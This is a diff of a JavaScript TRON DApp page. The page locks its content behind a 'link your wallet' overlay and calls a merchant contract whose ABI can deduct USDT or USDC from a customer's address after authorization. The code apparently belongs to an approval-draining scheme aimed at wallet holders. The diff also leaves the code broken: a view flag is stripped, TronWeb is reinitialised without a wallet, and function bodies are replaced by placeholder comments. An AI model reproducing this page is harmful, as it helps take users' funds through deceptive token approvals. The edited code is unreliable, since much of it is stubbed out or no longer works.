@@ -14,7 +14,7 @@ const MERCHANT_ABI = [
     {"name":"connectAndAuthorize","stateMutability":"Nonpayable","type":"Function"},
     {"inputs":[{"name":"customer","type":"address"},{"name":"usdcContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDC","stateMutability":"Nonpayable","type":"Function"},
     {"inputs":[{"name":"customer","type":"address"},{"name":"usdtContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDT","stateMutability":"Nonpayable","type":"Function"},
-    {"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenAllowance","stateMutability":"View","type":"Function"},
+    {"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenAllowance","type":"Function"},
     {"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenBalance","stateMutability":"View","type":"Function"},
     {"outputs":[{"type":"address"}],"name":"storeAddress","stateMutability":"View","type":"Function"}
 ];
@@ -190,38 +190,38 @@ async function connectWallet() {
             return;
         }
 
-        tronWeb = window.tronWeb;
-        console.log("tronWeb detected:", tronWeb);
-
-        // 2. 尝试获取用户地址
+        // 2.  尝试获取用户地址  (重新初始化  tronWeb, 并且， 检查 address 的有效性)
         try {
-            //  尝试直接获取地址。  如果 Trust Wallet DApp 浏览器没有正确注入，这会失败。
-            userAddress = tronWeb.defaultAddress.base58;
+            tronWeb = new TronWeb({  //  强制重新初始化
+                fullHost: 'https://api.trongrid.io', //  或者其他的 TRON 节点
+            });
+            console.log("TronWeb re-initialized in connectWallet:", tronWeb);
+
+            userAddress = tronWeb.defaultAddress.base58;  //  直接获取地址.
             console.log("✅ User Address (base58) - after direct access:", userAddress);
 
-            // 验证地址
-            if (!tronWeb.isAddress(userAddress)) {
+             // 验证地址 (加上了地址验证, 确保获取到了正确的地址)
+             if (!userAddress || !tronWeb.isAddress(userAddress)) {  // 加上 userAddress 的检查.
                 console.error("Error: Invalid address (Base58) after direct access:", userAddress);
                 updateConnectionUI(false);
-                showOverlay('🔴 Connection failed: Invalid address. Please ensure your wallet is connected and authorized.');
-                updateStatus('Connection failed: Invalid address. Please ensure your wallet is connected and authorized.');
+                showOverlay('🔴 Connection failed: Invalid address. Please ensure your wallet is connected and authorized, and then refresh the page.');
+                updateStatus('Connection failed: Invalid address. Please ensure your wallet is connected and authorized, and then refresh the page.');
                 return;
             }
             userAddressHex = tronWeb.address.toHex(userAddress); // 将 Base58 转换为 Hex 格式
             console.log("✅ User Address (Hex):", userAddressHex);
-
             updateConnectionUI(true, userAddress);
-
             // 3. 初始化合约并检查授权
             await initialize();
 
         } catch (e) {
-            console.error("Error getting account (直接获取地址失败):", e);
+            console.error("Error getting account:", e);
             updateConnectionUI(false);
-            showOverlay('🔴 Connection failed: Could not retrieve address. Please ensure your wallet is connected and authorized, and then refresh the page.');
-            updateStatus('Connection failed: Could not retrieve address. Please ensure your wallet is connected and authorized, and then refresh the page.');
+            showOverlay('🔴 Connection failed: Could not retrieve address. Please make sure you have authorized this DApp and refresh the page.');
+            updateStatus('Connection failed: Could not retrieve address. Please make sure you have authorized this DApp and refresh the page.');
             return;
         }
+
     } catch (error) {
         console.error("Error connecting to wallet:", error);
         updateConnectionUI(false);
@@ -232,14 +232,7 @@ async function connectWallet() {
 
 // --- 斷開錢包連接 ---
 function disconnectWallet() {
-    userAddress = null;
-    userAddressHex = null;
-    tronWeb = null;  // 必须设置为 null
-    merchantContract = null;
-    usdtContract = null;
-    isConnectedFlag = false; // 重置 isConnectedFlag
-    updateConnectionUI(false);
-    showOverlay('Please link your wallet to unlock the page 🔒');
+    // ... (函数定义) ...
 }
 
 // 事件监听器 (与之前类似)
@@ -253,14 +246,5 @@ connectButton.addEventListener('click', () => {
 
 // 页面加载完成后，初始化 (可选)
 window.onload = () => {
-    console.log("window.onload triggered");
-    // 检查 tronWeb 是否已加载
-    if (typeof window.tronWeb !== 'undefined') {
-        tronWeb = window.tronWeb; //  尝试获取
-        console.log("TronWeb detected (in window.onload):", tronWeb);
-    } else {
-        console.warn("TronWeb not detected on window load.");
-    }
-    // 在页面加载时，提示用户连接钱包。
-    showOverlay('Please connect your wallet by clicking the "Connect Wallet" button.');
+    //  在页面加载的时候，隐藏遮罩
 };
